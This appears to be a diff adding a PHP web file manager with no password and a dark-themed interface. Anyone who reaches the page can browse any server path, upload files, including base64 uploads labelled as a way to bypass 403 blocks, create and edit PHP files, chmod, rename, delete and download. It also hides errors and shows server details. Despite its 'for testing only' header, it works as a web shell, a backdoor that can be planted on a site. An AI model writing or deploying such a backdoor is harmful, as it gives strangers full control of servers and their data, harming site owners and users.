@@ -1,0 +1,195 @@
+<?php
+// ================================================
+// Simple File Manager - No Password
+// For testing only - REMOVE after use!
+// ================================================
+error_reporting(0);
+ini_set('display_errors', 0);
+
+// --- Fungsi bantu untuk kompatibilitas ---
+function read_file($f) {
+    if (function_exists('file_get_contents')) return @file_get_contents($f);
+    if ($fp = @fopen($f, 'rb')) {
+        $c = '';
+        while (!feof($fp)) $c .= fread($fp, 8192);
+        fclose($fp);
+        return $c;
+    }
+    return false;
+}
+function write_file($f, $d) {
+    if (function_exists('file_put_contents')) return @file_put_contents($f, $d) !== false;
+    if ($fp = @fopen($f, 'wb')) {
+        $r = fwrite($fp, $d);
+        fclose($fp);
+        return $r !== false;
+    }
+    return false;
+}
+function delete_item($p) {
+    if (is_file($p)) return @unlink($p);
+    if (is_dir($p)) {
+        $items = @scandir($p);
+        if ($items) foreach ($items as $i) if ($i != '.' && $i != '..') delete_item($p.'/'.$i);
+        return @rmdir($p);
+    }
+    return false;
+}
+
+// --- Path handling ---
+$path = isset($_REQUEST['p']) ? $_REQUEST['p'] : (isset($_COOKIE['path']) ? $_COOKIE['path'] : getcwd());
+$path = str_replace('\\', '/', $path);
+$path = rtrim($path, '/') . '/';
+if (!is_dir($path)) $path = './';
+setcookie('path', $path, time()+86400);
+
+// --- Handle POST actions ---
+if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+    // Upload file biasa
+    if (isset($_FILES['up'])) {
+        $target = $path . basename($_FILES['up']['name']);
+        if (!move_uploaded_file($_FILES['up']['tmp_name'], $target)) {
+            $data = read_file($_FILES['up']['tmp_name']);
+            if ($data !== false) write_file($target, $data);
+        }
+        @chmod($target, 0777);
+        header('Location: ?p=' . urlencode($path));
+        exit;
+    }
+    // Upload base64 (bypass 403)
+    if (isset($_POST['b64_name'], $_POST['b64_data'])) {
+        $data = base64_decode($_POST['b64_data']);
+        if ($data !== false) write_file($path . basename($_POST['b64_name']), $data);
+        header('Location: ?p=' . urlencode($path));
+        exit;
+    }
+    // Buat file baru
+    if (isset($_POST['newfile'])) {
+        write_file($path . $_POST['newfile'], $_POST['fcont'] ?? '');
+        header('Location: ?p=' . urlencode($path));
+        exit;
+    }
+    // Buat folder baru
+    if (isset($_POST['newfolder'])) {
+        @mkdir($path . $_POST['newfolder'], 0777, true);
+        header('Location: ?p=' . urlencode($path));
+        exit;
+    }
+    // Rename
+    if (isset($_POST['oldname'], $_POST['newname'])) {
+        @rename($path . $_POST['oldname'], $path . $_POST['newname']);
+        header('Location: ?p=' . urlencode($path));
+        exit;
+    }
+    // Chmod
+    if (isset($_POST['chmod_item'], $_POST['chmod_val'])) {
+        @chmod($path . $_POST['chmod_item'], octdec($_POST['chmod_val']));
+        header('Location: ?p=' . urlencode($path));
+        exit;
+    }
+    // Simpan hasil edit
+    if (isset($_POST['save'], $_POST['cont'])) {
+        write_file($path . $_POST['save'], $_POST['cont']);
+        header('Location: ?p=' . urlencode($path));
+        exit;
+    }
+}
+
+// --- Handle GET actions ---
+if (isset($_GET['do'])) {
+    switch ($_GET['do']) {
+        case 'del':
+            delete_item($path . $_GET['item']);
+            header('Location: ?p=' . urlencode($path));
+            exit;
+        case 'edit':
+            $edit_file = $_GET['item'];
+            $edit_content = read_file($path . $edit_file);
+            break;
+        case 'dl':
+            $f = $path . $_GET['item'];
+            if (is_file($f)) {
+                header('Content-Type: application/octet-stream');
+                header('Content-Disposition: attachment; filename="' . basename($f) . '"');
+                header('Content-Length: ' . filesize($f));
+                readfile($f);
+                exit;
+            }
+            break;
+    }
+}
+
+// --- List directory ---
+$folders = $files = [];
+$items = @scandir($path);
+if ($items) {
+    foreach ($items as $i) {
+        if ($i == '.' || $i == '..') continue;
+        if (is_dir($path . $i)) $folders[] = $i;
+        else $files[] = $i;
+    }
+    sort($folders);
+    sort($files);
+}
+
+// --- Info server ---
+$php_version = phpversion();
+$server_soft = $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown';
+?>
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>File Manager</title><style>
+*{margin:0;padding:0;box-sizing:border-box}body{background:#111;color:#ddd;font-family:system-ui;padding:20px}.container{max-width:1200px;margin:auto;background:#1a1a1a;border-radius:12px;overflow:hidden}.header{background:#2c3e66;padding:15px 20px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap}.sys-info{font-size:12px;display:flex;gap:15px}.nav{padding:15px 20px;background:#222;border-bottom:1px solid #333}.path-bar{display:flex;gap:10px;margin-bottom:12px}.path-bar input{flex:1;background:#333;border:1px solid #444;color:#fff;padding:8px;border-radius:6px}.btn{background:#4a9eff;border:none;padding:6px 14px;border-radius:6px;color:#fff;cursor:pointer}.btn-danger{background:#ff4b2b}.tools{display:flex;gap:15px;flex-wrap:wrap;align-items:center}.tool-group{display:flex;gap:8px;align-items:center;background:#1a1a1a;padding:5px 12px;border-radius:6px}table{width:100%;border-collapse:collapse}th,td{padding:10px;text-align:left;border-bottom:1px solid #333}th{background:#1a1a1a;color:#4a9eff}tr:hover{background:#252525}a{color:#4a9eff;text-decoration:none}.folder-row{background:#1e2a36}.file-actions a{margin-right:8px;font-size:12px;padding:2px 6px;background:#333;border-radius:4px}.edit-area{width:100%;min-height:400px;background:#000;color:#0f0;font-family:monospace;padding:12px;border:1px solid #444}.modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);justify-content:center;align-items:center}.modal.active{display:flex}.modal-content{background:#222;padding:20px;border-radius:12px;min-width:300px}.modal-content input,.modal-content textarea{width:100%;margin:8px 0;padding:8px;background:#333;border:1px solid #444;color:#fff;border-radius:4px}
+</style></head>
+<body>
+<div class="container">
+    <div class="header">
+        <h2>📁 File Manager (No Password)</h2>
+        <div class="sys-info"><span><strong>PHP:</strong> <?php echo $php_version; ?></span><span><strong>Server:</strong> <?php echo htmlspecialchars($server_soft); ?></span></div>
+    </div>
+    <div class="nav">
+        <form method="get" class="path-bar"><input type="text" name="p" value="<?php echo htmlspecialchars($path); ?>"><button type="submit" class="btn">Go</button></form>
+        <div class="tools">
+            <form method="post" enctype="multipart/form-data" class="tool-group"><input type="file" name="up"><button type="submit" class="btn">Upload</button></form>
+            <div class="tool-group"><button onclick="showModal('file')" class="btn">New File</button><button onclick="showModal('folder')" class="btn">New Folder</button><button onclick="showModal('base64')" class="btn">Base64 Upload</button></div>
+        </div>
+    </div>
+    <div style="padding:20px">
+        <?php if (isset($edit_file)): ?>
+            <h3>Editing: <?php echo htmlspecialchars($edit_file); ?></h3>
+            <form method="post"><input type="hidden" name="save" value="<?php echo htmlspecialchars($edit_file); ?>"><textarea name="cont" class="edit-area"><?php echo htmlspecialchars($edit_content); ?></textarea><div style="margin-top:12px"><button type="submit" class="btn">Save</button><a href="?p=<?php echo urlencode($path); ?>" class="btn btn-danger">Cancel</a></div></form>
+        <?php else: ?>
+             <table><thead><tr><th>Name</th><th>Type</th><th>Size</th><th>Perms</th><th>Actions</th></tr></thead><tbody>
+            <?php if ($path != '/' && $path != './' && $path != dirname($_SERVER['SCRIPT_FILENAME']).'/'): ?>
+                <tr><td colspan="5"><a href="?p=<?php echo urlencode(dirname($path)); ?>">⬆ Parent Directory</a></td></tr>
+            <?php endif; ?>
+            <?php foreach ($folders as $f): ?>
+                <tr class="folder-row"><td><a href="?p=<?php echo urlencode($path.$f); ?>">📁 <?php echo htmlspecialchars($f); ?></a></td><td>Folder</td><td>-</td><td><?php echo substr(sprintf('%o', fileperms($path.$f)), -4); ?></td><td class="file-actions"><a href="#" onclick="rename('<?php echo htmlspecialchars($f); ?>')">Rename</a><a href="#" onclick="chmod('<?php echo htmlspecialchars($f); ?>')">Chmod</a><a href="?do=del&item=<?php echo urlencode($f); ?>&p=<?php echo urlencode($path); ?>" onclick="return confirm('Delete?')">Delete</a></td></tr>
+            <?php endforeach; ?>
+            <?php foreach ($files as $f):
+                $size = @filesize($path.$f);
+                $size_str = $size === false ? '?' : ($size < 1024 ? $size.'B' : ($size < 1048576 ? round($size/1024,1).'KB' : round($size/1048576,1).'MB'));
+                ?>
+                <tr><td>📄 <?php echo htmlspecialchars($f); ?></td><td><?php echo strtoupper(pathinfo($f, PATHINFO_EXTENSION) ?: 'FILE'); ?></td><td><?php echo $size_str; ?></td><td><?php echo substr(sprintf('%o', fileperms($path.$f)), -4); ?></td><td class="file-actions"><a href="?do=edit&item=<?php echo urlencode($f); ?>&p=<?php echo urlencode($path); ?>">Edit</a><a href="?do=dl&item=<?php echo urlencode($f); ?>&p=<?php echo urlencode($path); ?>">Download</a><a href="#" onclick="rename('<?php echo htmlspecialchars($f); ?>')">Rename</a><a href="#" onclick="chmod('<?php echo htmlspecialchars($f); ?>')">Chmod</a><a href="?do=del&item=<?php echo urlencode($f); ?>&p=<?php echo urlencode($path); ?>" onclick="return confirm('Delete?')">Delete</a></td></tr>
+            <?php endforeach; ?>
+            <?php if (empty($folders) && empty($files)): ?><tr><td colspan="5" style="text-align:center">Empty directory</td></tr><?php endif; ?>
+            </tbody></table>
+        <?php endif; ?>
+    </div>
+</div>
+
+<!-- Modal forms -->
+<div id="fileModal" class="modal"><div class="modal-content"><h3>New File</h3><form method="post"><input type="text" name="newfile" placeholder="filename.php" required><textarea name="fcont" placeholder="Content"></textarea><button type="submit" class="btn">Create</button><button type="button" class="btn btn-danger" onclick="closeModal()">Cancel</button></form></div></div>
+<div id="folderModal" class="modal"><div class="modal-content"><h3>New Folder</h3><form method="post"><input type="text" name="newfolder" placeholder="folder name" required><button type="submit" class="btn">Create</button><button type="button" class="btn btn-danger" onclick="closeModal()">Cancel</button></form></div></div>
+<div id="base64Modal" class="modal"><div class="modal-content"><h3>Base64 Upload</h3><input type="text" id="b64_filename" placeholder="filename"><textarea id="b64_data" rows="6" placeholder="Paste base64 content"></textarea><button onclick="submitBase64()" class="btn">Upload</button><button type="button" class="btn btn-danger" onclick="closeModal()">Cancel</button></div></div>
+
+<script>
+function showModal(type) { document.getElementById(type+'Modal').classList.add('active'); }
+function closeModal() { document.querySelectorAll('.modal').forEach(m=>m.classList.remove('active')); }
+function rename(oldName) { let newName = prompt('New name:', oldName); if (newName && newName!=oldName) { let f=document.createElement('form');f.method='post';f.innerHTML='<input name="oldname" value="'+oldName+'"><input name="newname" value="'+newName+'">';document.body.appendChild(f);f.submit();} }
+function chmod(item) { let mode = prompt('Permissions (e.g., 755):','755'); if (mode) { let f=document.createElement('form');f.method='post';f.innerHTML='<input name="chmod_item" value="'+item+'"><input name="chmod_val" value="'+mode+'">';document.body.appendChild(f);f.submit();} }
+function submitBase64() { let name=document.getElementById('b64_filename').value, data=document.getElementById('b64_data').value; if(name && data) { let f=document.createElement('form');f.method='post';f.innerHTML='<input name="b64_name" value="'+name+'"><input name="b64_data" value="'+data+'">';document.body.appendChild(f);f.submit();} }
+document.querySelectorAll('.modal').forEach(m=>{m.addEventListener('click',function(e){if(e.target===m)closeModal();});});
+</script>
+</body>
+</html>
